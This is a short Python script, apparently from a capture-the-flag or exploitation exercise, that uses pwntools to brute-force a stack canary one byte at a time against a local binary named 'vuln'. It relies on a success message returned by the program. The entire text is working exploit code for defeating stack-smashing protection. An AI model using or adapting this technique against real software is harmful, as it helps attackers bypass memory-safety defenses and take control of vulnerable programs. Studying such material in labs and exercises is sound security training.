from pwn import *

canary=''

for i in range (0,4):
    for j in range(0,256):
        io= process('./vuln')
        padding = 'A'*32
        
        try :                      
            input_string = padding + canary + chr(j)
            io.sendline(str(len(input_string)))
            io.recvuntil('Input> ')
            io.sendline(input_string)
            response = io.recvline()
            
            if 'Ok..' in response :
                canary+=chr(j)
                break
        except:
            pass
        io.close()

print("CANARY FOUND : " + canary)
